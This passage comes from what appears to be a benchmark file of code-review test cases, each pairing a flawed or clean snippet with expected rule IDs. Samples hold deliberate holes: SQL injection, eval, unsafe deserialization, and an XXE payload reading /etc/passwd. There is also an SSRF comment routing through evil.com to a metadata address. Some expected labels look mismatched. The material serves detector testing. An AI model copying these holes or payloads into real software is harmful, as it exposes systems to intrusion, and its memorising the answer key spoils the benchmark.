// No connection draining
// No cleanup of database connections
// No flushing of metrics/logs
// In-flight requests will be abruptly terminated on deploy`,
    expectedRuleIds: ["REL-001", "CLOUD-001"],
    category: "reliability",
    difficulty: "medium",
  },
  {
    id: "aics-prompt-injection-passthrough-ts",
    description: "LLM prompt built from user input without injection protection",
    language: "typescript",
    code: `app.post("/api/chat", async (req, res) => {
  const userMessage = req.body.message;
  const response = await openai.chat.completions.create({
    model: "gpt-4",
    messages: [
      { role: "system", content: "You are a customer service assistant." },
      { role: "user", content: userMessage }, // Direct user input, no sanitization
    ],
  });
  res.json({ reply: response.choices[0].message.content });
});`,
    expectedRuleIds: ["AICS-001", "CYBER-001"],
    category: "ai-security",
    difficulty: "medium",
  },
  {
    id: "aics-tool-results-trusted-ts",
    description: "LLM agent trusting tool output without validation",
    language: "typescript",
    code: `async function agentLoop(query: string) {
  let messages = [{ role: "user", content: query }];
  while (true) {
    const response = await llm.complete(messages);
    if (response.toolCalls) {
      for (const call of response.toolCalls) {
        const result = await executeTool(call.name, call.args);
        // Tool output injected directly into LLM context without sanitization
        messages.push({ role: "tool", content: JSON.stringify(result) });
      }
    } else {
      return response.content;
    }
  }
}`,
    expectedRuleIds: ["COST-001", "PERF-001", "CONC-001"],
    category: "ai-security",
    difficulty: "hard",
  },
  {
    id: "hallu-react-useServerEffect-tsx",
    description: "Uses non-existent React.useServerEffect hook",
    language: "typescript",
    code: `import { useServerEffect } from "react";

function UserProfile({ userId }: { userId: string }) {
  const [user, setUser] = useState(null);
  useServerEffect(async () => {
    const data = await fetch(\`/api/users/\${userId}\`);
    setUser(await data.json());
  }, [userId]);

  return <div>{user?.name}</div>;
}`,
    expectedRuleIds: ["SCALE-001"],
    category: "hallucination-detection",
    difficulty: "easy",
  },
  {
    id: "hallu-node-crypto-sign-method",
    description: "Uses non-existent crypto.signMessage() method",
    language: "javascript",
    code: `const crypto = require("crypto");

function signPayload(payload, privateKey) {
  return crypto.signMessage(payload, privateKey, "sha256");
  // crypto.signMessage does not exist; should use crypto.sign() or crypto.createSign()
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-java-stream-filterMap",
    description: "Uses non-existent Java Stream.filterMap() method",
    language: "java",
    code: `import java.util.List;
import java.util.stream.Collectors;

public class UserFilter {
    public List<String> getActiveUserNames(List<User> users) {
        return users.stream()
            .filterMap(u -> u.isActive() ? u.getName() : null)  // filterMap doesn't exist in Java
            .collect(Collectors.toList());
    }
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "i18n-string-length-validation-ts",
    description: "Validating string length with .length, not accounting for multi-byte chars",
    language: "typescript",
    code: `function validateUsername(name: string): boolean {
  if (name.length > 20) return false;  // '𝕳𝖊𝖑𝖑𝖔'.length === 10 in JS (5 chars, 10 code units)
  return /^[a-zA-Z0-9_]+$/.test(name); // rejects non-ASCII alphabets
}

function truncate(text: string, maxLen: number): string {
  return text.slice(0, maxLen); // may split surrogate pairs
}`,
    expectedRuleIds: [],
    category: "internationalization",
    difficulty: "hard",
  },
  {
    id: "i18n-rtl-layout-ignore-tsx",
    description: "React UI that ignores RTL layout requirements",
    language: "typescript",
    code: `function Sidebar() {
  return (
    <div style={{ position: "fixed", left: 0, top: 0, width: 250 }}>
      <nav>
        <div style={{ paddingLeft: 20 }}>Home</div>
        <div style={{ paddingLeft: 20 }}>Settings</div>
        <div style={{ textAlign: "left" }}>
          <span style={{ marginRight: 8 }}>→</span> Next
        </div>
      </nav>
    </div>
  );
}`,
    expectedRuleIds: ["I18N-001", "A11Y-001"],
    category: "internationalization",
    difficulty: "medium",
  },
  {
    id: "ux-no-loading-state-tsx",
    description: "Data-fetching component with no loading or error states",
    language: "typescript",
    code: `function UserDashboard() {
  const [data, setData] = useState(null);
  useEffect(() => {
    fetch("/api/dashboard").then(r => r.json()).then(setData);
  }, []);
  // No loading spinner, no error handling, blank screen while fetching
  return (
    <div>
      <h1>{data.user.name}</h1>
      <p>{data.stats.totalOrders}</p>
    </div>
  );
}`,
    expectedRuleIds: ["UX-001", "ERR-001"],
    category: "user-experience",
    difficulty: "easy",
  },
  {
    id: "comp-no-license-header-ts",
    description: "Source file missing required license/copyright header",
    language: "typescript",
    code: `// No license header, no copyright notice
// Company policy requires Apache 2.0 header in all source files

export class BillingService {
  async calculateInvoice(customerId: string): Promise<Invoice> {
    const usage = await this.getUsage(customerId);
    const rate = await this.getRate(customerId);
    return { customerId, amount: usage * rate, currency: "USD" };
  }
}`,
    expectedRuleIds: [],
    category: "compliance",
    difficulty: "easy",
  },
  {
    id: "iac-k8s-no-network-policy-yaml",
    description: "Kubernetes deployment without NetworkPolicy isolation",
    language: "yaml",
    code: `apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-service
spec:
  replicas: 3
  template:
    spec:
      containers:
        - name: payment
          image: company/payment:latest
          ports:
            - containerPort: 8080
# No NetworkPolicy defined
# Any pod in the cluster can reach port 8080
# No ingress/egress restrictions on the payment service`,
    expectedRuleIds: ["IAC-001", "SEC-001"],
    category: "iac-security",
    difficulty: "medium",
  },
  {
    id: "iac-helm-values-secrets-yaml",
    description: "Helm values.yaml with plaintext database credentials",
    language: "yaml",
    code: `database:
  host: prod-postgres.internal
  port: 5432
  username: app_admin
  password: "Pr0d_P@ssw0rd!"
  name: production

redis:
  host: prod-redis.internal
  auth: "redis-secret-token-123"

smtp:
  host: smtp.sendgrid.net
  apiKey: "SG.abc123xyz789"`,
    expectedRuleIds: ["IAC-001", "AUTH-001", "CFG-001"],
    category: "iac-security",
    difficulty: "easy",
  },
  {
    id: "conc-shared-mutable-no-lock-rs",
    description: "Rust shared mutable state using unsafe to bypass borrow checker",
    language: "rust",
    code: `use std::thread;

static mut COUNTER: i64 = 0;

fn increment() {
    unsafe {
        COUNTER += 1; // data race — no synchronization
    }
}

fn main() {
    let handles: Vec<_> = (0..10)
        .map(|_| thread::spawn(|| {
            for _ in 0..1000 {
                increment();
            }
        }))
        .collect();
    for h in handles { h.join().unwrap(); }
    unsafe { println!("Counter: {}", COUNTER); }
}`,
    expectedRuleIds: ["CONC-001", "CYBER-001"],
    category: "concurrency",
    difficulty: "hard",
  },
  {
    id: "cyber-ssrf-via-redirect-ts",
    description: "HTTP client following redirects to internal services (SSRF)",
    language: "typescript",
    code: `app.get("/api/proxy", async (req, res) => {
  const url = req.query.url as string;
  // Follows redirects — attacker can redirect to internal services
  const response = await fetch(url, { redirect: "follow" });
  const html = await response.text();
  res.send(html);
  // Attacker: /api/proxy?url=https://evil.com/redirect-to-169.254.169.254
});`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "security",
    difficulty: "hard",
  },
  {
    id: "cyber-xml-external-entity-py",
    description: "XML parsing vulnerable to XXE attack",
    language: "python",
    code: `from lxml import etree

def parse_xml_config(xml_string):
    parser = etree.XMLParser(resolve_entities=True)
    doc = etree.fromstring(xml_string, parser)
    return {child.tag: child.text for child in doc}

# Attacker input:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <config><db_host>&xxe;</db_host></config>`,
    expectedRuleIds: ["CYBER-001", "DATA-001"],
    category: "security",
    difficulty: "hard",
  },
  {
    id: "scale-synchronous-broadcast-ts",
    description: "Synchronous fan-out to all subscribers blocking the request",
    language: "typescript",
    code: `app.post("/api/events", async (req, res) => {
  const event = req.body;
  const subscribers = await db.getSubscribers(event.type);
  // Synchronous — blocks until ALL subscribers respond
  for (const sub of subscribers) {
    await fetch(sub.webhookUrl, {
      method: "POST",
      body: JSON.stringify(event),
      signal: AbortSignal.timeout(30000),
    });
  }
  res.json({ delivered: subscribers.length });
  // 100 subscribers × 30s timeout = potentially 50 min request
});`,
    expectedRuleIds: ["API-001", "SEC-001"],
    category: "scalability",
    difficulty: "hard",
  },
  {
    id: "clean-well-tested-utility-ts",
    description: "Utility module with comprehensive validation and docs",
    language: "typescript",
    code: `/**
 * Parses a semantic version string into its components.
 * @param version - A semver string like "1.2.3-beta.1+build.42"
 * @returns Parsed version object or null if invalid.
 */
export function parseSemver(version: string): SemVer | null {
  const match = version.match(
    /^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)(?:-((?:[a-zA-Z\\d-]+\\.?)+))?(?:\\+([a-zA-Z\\d.]+))?$/
  );
  if (!match) return null;
  return {
    major: parseInt(match[1], 10),
    minor: parseInt(match[2], 10),
    patch: parseInt(match[3], 10),
    prerelease: match[4] ?? undefined,
    build: match[5] ?? undefined,
  };
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["HALLU", "MAINT", "DOC", "ERR"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "clean-robust-error-handling-ts",
    description: "Error handling with typed errors, context, and proper logging",
    language: "typescript",
    code: `class AppError extends Error {
  constructor(
    message: string,
    public readonly code: string,
    public readonly statusCode: number,
    public readonly cause?: Error,
  ) {
    super(message);
    this.name = "AppError";
  }
}

async function processOrder(orderId: string): Promise<Order> {
  const order = await db.findOrder(orderId);
  if (!order) {
    throw new AppError("Order not found", "ORDER_NOT_FOUND", 404);
  }
  try {
    await paymentService.charge(order);
  } catch (err) {
    logger.error("Payment failed", { orderId, error: err });
    throw new AppError("Payment processing failed", "PAYMENT_ERROR", 502, err as Error);
  }
  return order;
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["ERR", "OBS", "MAINT"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-accessible-form-tsx",
    description: "React form with proper accessibility attributes and labels",
    language: "typescript",
    code: `import { useState } from "react";
import { useTranslation } from "react-i18next";

function ContactForm() {
  const { t } = useTranslation();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await submitForm(new FormData(e.currentTarget as HTMLFormElement));
    } catch (err) {
      setErrors({ form: t("submitError") });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} aria-label={t("contactForm")} noValidate>
      <div role="group" aria-labelledby="personal-info">
        <h2 id="personal-info">{t("personalInfo")}</h2>
        <label htmlFor="name">{t("fullName")}</label>
        <input id="name" name="name" type="text" required aria-required="true"
               aria-describedby="name-hint" autoComplete="name" />
        <span id="name-hint" className="hint">{t("nameHint")}</span>

        <label htmlFor="email">{t("emailAddress")}</label>
        <input id="email" name="email" type="email" required aria-required="true"
               autoComplete="email" aria-invalid={!!errors.email} />
        {errors.email && <span role="alert">{errors.email}</span>}
      </div>
      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? t("sending") : t("sendMessage")}
      </button>
    </form>
  );
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["A11Y", "UX", "HALLU"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-i18n-proper-formatting-ts",
    description: "Proper internationalization with Intl API for dates, currencies, and plurals",
    language: "typescript",
    code: `function formatPrice(amount: number, currency: string, locale: string): string {
  return new Intl.NumberFormat(locale, { style: "currency", currency }).format(amount);
}

function formatDate(date: Date, locale: string): string {
  return new Intl.DateTimeFormat(locale, {
    year: "numeric", month: "long", day: "numeric"
  }).format(date);
}

function pluralize(count: number, locale: string): string {
  const pr = new Intl.PluralRules(locale);
  const forms: Record<string, string> = {
    one: \`\${count} item\`, other: \`\${count} items\`
  };
  return forms[pr.select(count)] ?? forms.other;
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["I18N", "HALLU", "PORTA"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "supply-lockfile-integrity-check-ts",
    description: "Build script that verifies lockfile integrity before install",
    language: "typescript",
    code: `import { execSync } from "child_process";
import { readFileSync, existsSync } from "fs";
import { createHash } from "crypto";

function verifyLockfile(): void {
  if (!existsSync("package-lock.json")) {
    throw new Error("package-lock.json missing — run npm install first");
  }
  const lockContent = readFileSync("package-lock.json", "utf-8");
  const lock = JSON.parse(lockContent);
  if (lock.lockfileVersion < 3) {
    throw new Error("Lockfile version too old — upgrade npm");
  }
  // Verify integrity hashes exist for all packages
  for (const [name, pkg] of Object.entries(lock.packages || {})) {
    if (name && !(pkg as any).integrity) {
      throw new Error(\`Missing integrity hash for \${name}\`);
    }
  }
  execSync("npm ci", { stdio: "inherit" });
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["SUPPLY", "DEPS", "CYBER"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "perf-n-plus-one-graphql-ts",
    description: "GraphQL resolver with N+1 query problem",
    language: "typescript",
    code: `const resolvers = {
  Query: {
    users: () => db.query("SELECT * FROM users"),
  },
  User: {
    // Called once per user — if 100 users, 100 separate queries
    posts: (user: User) =>
      db.query("SELECT * FROM posts WHERE author_id = $1", [user.id]),
    // Another N+1
    followers: (user: User) =>
      db.query("SELECT * FROM follows WHERE following_id = $1", [user.id]),
  },
};`,
    expectedRuleIds: ["PERF-001", "DB-001"],
    category: "performance",
    difficulty: "hard",
  },
  {
    id: "maint-boolean-trap-api-ts",
    description: "Functions with boolean parameters creating confusing call sites",
    language: "typescript",
    code: `function createUser(name: string, admin: boolean, active: boolean, verified: boolean) {
  // ...
}

// At call site — what do these booleans mean?
createUser("Alice", true, false, true);
createUser("Bob", false, true, false);

function sendEmail(to: string, html: boolean, urgent: boolean, track: boolean) {
  // ...
}

sendEmail("user@example.com", true, false, true); // ?`,
    expectedRuleIds: ["MAINT-001", "API-001"],
    category: "code-quality",
    difficulty: "easy",
  },
  {
    id: "doc-jsdoc-param-mismatch-ts",
    description: "JSDoc comments that don't match the actual function signature",
    language: "typescript",
    code: `/**
 * Creates a new user account.
 * @param name - The user's full name
 * @param email - The user's email address
 * @returns The user ID
 */
export async function createUser(
  data: CreateUserInput,
  options?: CreateOptions,
): Promise<User> {
  // JSDoc says (name, email) -> ID
  // Actual is (data, options?) -> User
  return db.insert("users", data);
}`,
    expectedRuleIds: [],
    category: "documentation",
    difficulty: "easy",
  },
  {
    id: "db-concurrent-counter-no-lock-py",
    description: "Database counter increment without locking or atomic operation",
    language: "python",
    code: `async def increment_view_count(article_id: int):
    row = await db.fetchone(
        "SELECT view_count FROM articles WHERE id = $1", article_id
    )
    new_count = row["view_count"] + 1
    await db.execute(
        "UPDATE articles SET view_count = $1 WHERE id = $2",
        new_count, article_id
    )
    # Race condition: two concurrent requests read same count,
    # both increment to same value, losing one increment`,
    expectedRuleIds: [],
    category: "database",
    difficulty: "medium",
  },
  {
    id: "auth-password-in-url-ts",
    description: "Passing credentials in URL query parameters",
    language: "typescript",
    code: `async function authenticate(username: string, password: string) {
  const response = await fetch(
    \`https://api.example.com/login?username=\${username}&password=\${password}\`
  );
  return response.json();
}

// Password visible in browser history, server logs, proxy logs, referer headers`,
    expectedRuleIds: ["SCALE-001"],
    category: "auth",
    difficulty: "easy",
  },
  {
    id: "clean-concurrent-worker-pool-ts",
    description: "Worker pool with proper concurrency controls and cleanup",
    language: "typescript",
    code: `class WorkerPool<T, R> {
  private semaphore: Semaphore;
  private results: Map<string, R> = new Map();

  constructor(private concurrency: number, private handler: (task: T) => Promise<R>) {
    this.semaphore = new Semaphore(concurrency);
  }

  async execute(taskId: string, task: T): Promise<R> {
    const release = await this.semaphore.acquire();
    try {
      const result = await this.handler(task);
      this.results.set(taskId, result);
      return result;
    } finally {
      release();
    }
  }

  async shutdown(): Promise<void> {
    await this.semaphore.drain();
    this.results.clear();
  }
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["CONC", "PERF", "REL", "SCALE"],
    category: "clean",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // FINAL 26+ — breaking through 1000
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "hallu-go-generics-constraint-go",
    description: "Uses non-existent Go generic constraint syntax",
    language: "go",
    code: `package main

func Map[T any, U any](slice []T, fn func(T) U) []U {
    result := make([]U, len(slice))
    for i, v := range slice {
        result[i] = fn(v)
    }
    return result
}

// This doesn't exist in Go
func Filter[T implements Comparable](slice []T, pred func(T) bool) []T {
    var result []T
    for _, v := range slice {
        if pred(v) { result = append(result, v) }
    }
    return result
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "hard",
  },
  {
    id: "hallu-css-parent-selector",
    description: "Uses non-existent CSS parent() selector",
    language: "css",
    code: `.child:hover:parent() {
  background: yellow;
}

.error-message:parent(.form-group) {
  border: 2px solid red;
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "easy",
  },
  {
    id: "sec-eval-user-code-ts",
    description: "Server evaluating user-submitted code expressions",
    language: "typescript",
    code: `app.post("/api/calculate", (req, res) => {
  const { expression } = req.body;
  try {
    const result = eval(expression);
    res.json({ result });
  } catch (err) {
    res.status(400).json({ error: "Invalid expression" });
  }
});`,
    expectedRuleIds: ["SEC-001", "CYBER-001"],
    category: "security",
    difficulty: "easy",
  },
  {
    id: "data-unencrypted-backup-py",
    description: "Database backup stored unencrypted in public S3 bucket",
    language: "python",
    code: `import subprocess
import boto3

def backup_database():
    subprocess.run(["pg_dump", "-U", "admin", "production_db", "-f", "/tmp/backup.sql"])
    s3 = boto3.client("s3")
    s3.upload_file("/tmp/backup.sql", "company-backups", "db/latest.sql")
    # No encryption, bucket may be public, credentials in dump command`,
    expectedRuleIds: ["DATA-001", "AUTH-001", "CYBER-001"],
    category: "data-security",
    difficulty: "hard",
  },
  {
    id: "err-callback-error-ignored-js",
    description: "Node.js callback error parameter ignored",
    language: "javascript",
    code: `const fs = require("fs");

fs.readFile("/etc/config.json", "utf-8", (err, data) => {
  const config = JSON.parse(data); // data may be undefined if err occurred
  startServer(config);
});

fs.writeFile("/var/log/app.log", logData, (err) => {
  // err completely ignored
  console.log("Log written successfully");
});`,
    expectedRuleIds: ["CLOUD-001", "PORTA-001"],
    category: "error-handling",
    difficulty: "easy",
  },
  {
    id: "porta-registry-access-ts",
    description: "Windows registry access in cross-platform Node.js app",
    language: "typescript",
    code: `import { execSync } from "child_process";

function getInstalledVersion(): string {
  const result = execSync(
    'reg query "HKLM\\\\SOFTWARE\\\\MyApp" /v Version',
    { encoding: "utf-8" }
  );
  return result.split("REG_SZ")[1].trim();
}

function setAutoStart(enabled: boolean): void {
  const cmd = enabled
    ? 'reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v MyApp /d "C:\\\\MyApp\\\\app.exe"'
    : 'reg delete "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v MyApp /f';
  execSync(cmd);
}`,
    expectedRuleIds: ["PORTA-001"],
    category: "portability",
    difficulty: "medium",
  },
  {
    id: "agent-no-output-limits-py",
    description: "AI agent with no output length limits or content filtering",
    language: "python",
    code: `def run_agent(prompt):
    response = openai.chat.completions.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}],
        max_tokens=None,  # no limit
    )
    content = response.choices[0].message.content
    # No content filtering, no length check
    # Directly rendered in UI without sanitization
    return {"html": f"<div>{content}</div>"}`,
    expectedRuleIds: ["AGENT-001", "AICS-001"],
    category: "agent-instructions",
    difficulty: "medium",
  },
  {
    id: "ethics-dark-pattern-confirm-tsx",
    description: "Confirmshaming dark pattern in subscription cancellation",
    language: "typescript",
    code: `function CancelSubscription() {
  return (
    <div>
      <h2>Are you sure you want to cancel?</h2>
      <p>You'll lose access to all premium features forever.</p>
      <button onClick={cancel} style={{ fontSize: 10, color: "#ccc" }}>
        Yes, I don't want to save money anymore
      </button>
      <button onClick={keepSubscription}
        style={{ fontSize: 18, backgroundColor: "green", color: "white", padding: 20 }}>
        No, keep my amazing subscription!
      </button>
    </div>
  );
}`,
    expectedRuleIds: ["A11Y-001"],
    category: "ethics-bias",
    difficulty: "medium",
  },
  {
    id: "test-no-assertions-ts",
    description: "Test that runs code but has no assertions",
    language: "typescript",
    code: `describe("UserService", () => {
  it("should create a user", async () => {
    const service = new UserService(mockDb);
    const user = await service.create({ name: "Alice", email: "alice@test.com" });
    console.log("Created user:", user);
    // No expect(), no assert — test always passes
  });

  it("should handle errors", async () => {
    const service = new UserService(mockDb);
    try {
      await service.create({ name: "", email: "" });
    } catch (e) {
      console.log("Got error:", e);
      // Caught but never asserted
    }
  });
});`,
    expectedRuleIds: ["TEST-001"],
    category: "testing",
    difficulty: "easy",
  },
  {
    id: "sov-analytics-third-party-ts",
    description: "Third-party analytics collecting user data without consent gate",
    language: "typescript",
    code: `// Loaded on every page, no consent check
(function() {
  const script = document.createElement("script");
  script.src = "https://analytics.thirdparty.com/track.js";
  document.head.appendChild(script);

  window.analytics = {
    track(event: string, data: any) {
      fetch("https://analytics.thirdparty.com/collect", {
        method: "POST",
        body: JSON.stringify({
          event,
          data,
          userId: localStorage.getItem("userId"),
          ip: true,
          fingerprint: true,
        }),
      });
    },
  };
})();`,
    expectedRuleIds: ["SOV-001", "DATA-001", "COMP-001"],
    category: "data-sovereignty",
    difficulty: "medium",
  },
  {
    id: "cache-stampede-ts",
    description: "Cache implementation vulnerable to thundering herd/stampede",
    language: "typescript",
    code: `async function getProduct(id: string): Promise<Product> {
  const cached = await redis.get(\`product:\${id}\`);
  if (cached) return JSON.parse(cached);

  // When cache expires, ALL concurrent requests hit the database
  const product = await db.query("SELECT * FROM products WHERE id = $1", [id]);
  await redis.set(\`product:\${id}\`, JSON.stringify(product), "EX", 60);
  return product;
}`,
    expectedRuleIds: ["CACHE-001", "SCALE-001"],
    category: "caching",
    difficulty: "hard",
  },
  {
    id: "rate-enumeration-no-limit-ts",
    description: "User enumeration endpoint without rate limiting",
    language: "typescript",
    code: `app.post("/api/forgot-password", async (req, res) => {
  const { email } = req.body;
  const user = await db.findUserByEmail(email);
  if (user) {
    await sendResetEmail(user);
    res.json({ message: "Reset email sent" });
  } else {
    res.json({ message: "If that email exists, we sent a reset link" });
  }
  // No rate limiting — attacker can enumerate emails at scale
  // Response timing differs between found/not-found
});`,
    expectedRuleIds: ["CYBER-001", "API-001", "SEC-001"],
    category: "rate-limiting",
    difficulty: "medium",
  },
  {
    id: "rel-single-point-of-failure-ts",
    description: "Architecture with single database, no failover",
    language: "typescript",
    code: `const db = new Pool({
  host: "primary-db.prod.internal",
  port: 5432,
  max: 20,
  // No read replicas, no failover, no connection retry
  // Single host — if it goes down, entire app is offline
});

export async function query(sql: string, params?: any[]) {
  return db.query(sql, params);
  // No circuit breaker, no timeout, no fallback
}`,
    expectedRuleIds: ["PERF-001"],
    category: "reliability",
    difficulty: "medium",
  },
  {
    id: "cost-unbounded-api-calls-ts",
    description: "Recursive API pagination with no limit on total pages fetched",
    language: "typescript",
    code: `async function fetchAllRecords(url: string): Promise<any[]> {
  const results: any[] = [];
  let nextUrl: string | null = url;
  while (nextUrl) {
    const response = await fetch(nextUrl);
    const data = await response.json();
    results.push(...data.items);
    nextUrl = data.nextPageUrl; // Could be millions of pages
  }
  return results; // Unbounded memory + API cost
}`,
    expectedRuleIds: ["COST-001", "PERF-001", "SCALE-001"],
    category: "cost-effectiveness",
    difficulty: "medium",
  },
  {
    id: "cfg-env-not-validated-ts",
    description: "Environment variables used without validation or defaults",
    language: "typescript",
    code: `const config = {
  port: parseInt(process.env.PORT!),         // NaN if missing
  dbHost: process.env.DATABASE_HOST!,        // undefined if missing
  redisUrl: process.env.REDIS_URL!,          // crashes at runtime
  apiKey: process.env.API_KEY!,              // no validation
  maxRetries: parseInt(process.env.MAX_RETRIES!), // NaN
  debug: process.env.DEBUG === "true",       // only one that won't crash
};

// App starts even if critical config is missing/invalid
// Fails at random point when config is first accessed`,
    expectedRuleIds: [],
    category: "configuration",
    difficulty: "easy",
  },
  {
    id: "clean-secure-api-middleware-ts",
    description: "Express middleware with all security best practices",
    language: "typescript",
    code: `import helmet from "helmet";
import rateLimit from "express-rate-limit";
import cors from "cors";

app.use(helmet());
app.use(cors({
  origin: ["https://app.example.com"],
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
}));
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
}));
app.use(express.json({ limit: "10kb" }));

app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  logger.error("Unhandled error", { error: err.message, path: req.path });
  res.status(500).json({ error: "Internal server error" });
});`,
    expectedRuleIds: ["ERR-001"],
    unexpectedRuleIds: ["SEC", "CYBER", "FW", "RATE"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-db-migration-py",
    description: "Proper database migration with rollback support",
    language: "python",
    code: `"""Add user roles table — migration 2024_001"""
from alembic import op
import sqlalchemy as sa

def upgrade():
    op.create_table(
        "roles",
        sa.Column("id", sa.Integer, primary_key=True),
        sa.Column("name", sa.String(64), nullable=False, unique=True),
        sa.Column("created_at", sa.DateTime, server_default=sa.func.now()),
    )
    op.add_column("users", sa.Column("role_id", sa.Integer, sa.ForeignKey("roles.id")))

def downgrade():
    op.drop_column("users", "role_id")
    op.drop_table("roles")`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["DB", "MAINT", "REL"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "clean-logging-best-practices-ts",
    description: "Structured logging with PII redaction and correlation IDs",
    language: "typescript",
    code: `import pino from "pino";

const logger = pino({
  redact: ["req.headers.authorization", "user.email", "user.ssn", "password"],
  serializers: {
    req: (req) => ({ method: req.method, url: req.url, correlationId: req.id }),
    err: pino.stdSerializers.err,
  },
});

function requestLogger(req: Request, res: Response, next: NextFunction) {
  req.id = req.headers["x-correlation-id"] as string || crypto.randomUUID();
  const child = logger.child({ correlationId: req.id, service: "api" });
  req.log = child;
  child.info({ req }, "Request received");
  const start = Date.now();
  res.on("finish", () => {
    child.info({ statusCode: res.statusCode, durationMs: Date.now() - start }, "Request completed");
  });
  next();
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["LOGPRIV", "OBS", "DATA"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "maint-copy-paste-handlers-ts",
    description: "Copy-pasted handler logic with minor variations",
    language: "typescript",
    code: `app.get("/api/users", async (req, res) => {
  try {
    const page = parseInt(req.query.page as string) || 1;
    const limit = parseInt(req.query.limit as string) || 20;
    const data = await db.query("SELECT * FROM users LIMIT $1 OFFSET $2", [limit, (page-1)*limit]);
    res.json({ data: data.rows, page, limit });
  } catch (err) { res.status(500).json({ error: "Internal error" }); }
});

app.get("/api/orders", async (req, res) => {
  try {
    const page = parseInt(req.query.page as string) || 1;
    const limit = parseInt(req.query.limit as string) || 20;
    const data = await db.query("SELECT * FROM orders LIMIT $1 OFFSET $2", [limit, (page-1)*limit]);
    res.json({ data: data.rows, page, limit });
  } catch (err) { res.status(500).json({ error: "Internal error" }); }
});

app.get("/api/products", async (req, res) => {
  try {
    const page = parseInt(req.query.page as string) || 1;
    const limit = parseInt(req.query.limit as string) || 20;
    const data = await db.query("SELECT * FROM products LIMIT $1 OFFSET $2", [limit, (page-1)*limit]);
    res.json({ data: data.rows, page, limit });
  } catch (err) { res.status(500).json({ error: "Internal error" }); }
});`,
    expectedRuleIds: ["SWDEV-001", "API-001", "OBS-001", "ERR-001", "DB-001", "COMPAT-001"],
    category: "code-quality",
    difficulty: "medium",
  },
  {
    id: "cyber-unsafe-deserialization-java",
    description: "Java ObjectInputStream deserializing untrusted data",
    language: "java",
    code: `import java.io.*;

public class MessageHandler {
    public Object deserializeMessage(byte[] data) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        return ois.readObject(); // Deserializes arbitrary classes — RCE vector
    }

    // Called with user-supplied data from HTTP request body
    public void handleRequest(HttpServletRequest req) throws Exception {
        byte[] body = req.getInputStream().readAllBytes();
        Object message = deserializeMessage(body);
        process(message);
    }
}`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "security",
    difficulty: "hard",
  },
  {
    id: "db-sql-injection-csharp",
    description: "C# SQL injection via string concatenation",
    language: "csharp",
    code: `public class UserRepository
{
    public User GetUser(string username)
    {
        var query = "SELECT * FROM Users WHERE Username = '" + username + "'";
        using var cmd = new SqlCommand(query, connection);
        using var reader = cmd.ExecuteReader();
        if (reader.Read())
            return new User { Name = reader["Name"].ToString() };
        return null;
    }
}`,
    expectedRuleIds: ["CYBER-001", "DB-001"],
    category: "security",
    difficulty: "easy",
  },
  {
    id: "perf-sync-crypto-in-request-ts",
    description: "Synchronous CPU-intensive crypto in request handler",
    language: "typescript",
    code: `import { pbkdf2Sync, randomBytes } from "crypto";

app.post("/api/register", (req, res) => {
  const { username, password } = req.body;
  const salt = randomBytes(32);
  // Blocks the event loop for ~500ms per request
  const hash = pbkdf2Sync(password, salt, 600000, 64, "sha512");
  db.createUser(username, hash, salt);
  res.json({ success: true });
});`,
    expectedRuleIds: ["CYBER-001", "SCALE-001", "API-001"],
    category: "performance",
    difficulty: "medium",
  },
  {
    id: "auth-hardcoded-api-keys-py",
    description: "API keys hardcoded directly in source code",
    language: "python",
    code: `STRIPE_API_KEY = "sk_live_abc123xyz789"
SENDGRID_KEY = "SG.abcdef123456"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

def charge_customer(amount, token):
    stripe.api_key = STRIPE_API_KEY
    return stripe.Charge.create(amount=amount, source=token)`,
    expectedRuleIds: ["AUTH-001", "CFG-001"],
    category: "auth",
    difficulty: "easy",
  },
  {
    id: "clean-graceful-shutdown-ts",
    description: "Server with proper graceful shutdown and connection draining",
    language: "typescript",
    code: `const server = app.listen(3000, () => logger.info("Server started"));

